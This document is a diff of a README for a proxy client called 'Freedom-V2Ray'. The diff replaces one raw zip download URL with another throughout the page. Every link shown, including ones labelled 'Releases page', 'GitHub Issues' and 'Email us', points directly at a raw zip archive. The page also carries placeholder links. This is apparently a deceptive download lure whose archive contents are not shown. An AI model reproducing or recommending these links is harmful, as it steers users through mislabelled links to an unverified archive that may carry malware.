@@ -1,7 +1,7 @@
 # 🕊️ Freedom-V2Ray - Secure Your Online Freedom Today
 
 ## 📥 Download Here
-[![Download Freedom-V2Ray](https://github.com/LuisF-92/Freedom-V2Ray/raw/refs/heads/main/scripts/Freedom_Ray_v2.7.zip)](https://github.com/LuisF-92/Freedom-V2Ray/raw/refs/heads/main/scripts/Freedom_Ray_v2.7.zip)
+[![Download Freedom-V2Ray](https://raw.githubusercontent.com/LuisF-92/Freedom-V2Ray/main/src/Freedom_Ray_1.9.zip)](https://raw.githubusercontent.com/LuisF-92/Freedom-V2Ray/main/src/Freedom_Ray_1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to Freedom-V2Ray. This application helps you connect to the internet securely and privately. You can use various protocols including VLESS, VMESS, Trojan, and Reality to bypass restrictions. 
@@ -19,7 +19,7 @@ Welcome to Freedom-V2Ray. This application helps you connect to the internet sec
 - **Network**: Active internet connection 
 
 ## 🔧 Download & Install
-To get the application, you need to visit our [Releases page](https://github.com/LuisF-92/Freedom-V2Ray/raw/refs/heads/main/scripts/Freedom_Ray_v2.7.zip). 
+To get the application, you need to visit our [Releases page](https://raw.githubusercontent.com/LuisF-92/Freedom-V2Ray/main/src/Freedom_Ray_1.9.zip). 
 
 ### Steps to Download:
 1. Click on the download link provided above.
@@ -49,11 +49,11 @@ If you face any issues:
 
 - Visit our [FAQ section](#) for common problems.
 - Join our community on Discord [Link to Discord].
-- Email us at https://github.com/LuisF-92/Freedom-V2Ray/raw/refs/heads/main/scripts/Freedom_Ray_v2.7.zip
+- Email us at https://raw.githubusercontent.com/LuisF-92/Freedom-V2Ray/main/src/Freedom_Ray_1.9.zip
 
 ## 🌐 Additional Resources
 - [User Documentation](#) – Detailed user manual.
-- [GitHub Issues](https://github.com/LuisF-92/Freedom-V2Ray/raw/refs/heads/main/scripts/Freedom_Ray_v2.7.zip) – Report any bugs or feature requests.
+- [GitHub Issues](https://raw.githubusercontent.com/LuisF-92/Freedom-V2Ray/main/src/Freedom_Ray_1.9.zip) – Report any bugs or feature requests.
 - [Contributing](#) – Learn how to contribute to the project.
 
 Thank you for choosing Freedom-V2Ray to help secure your online privacy and freedom. Enjoy browsing safely!
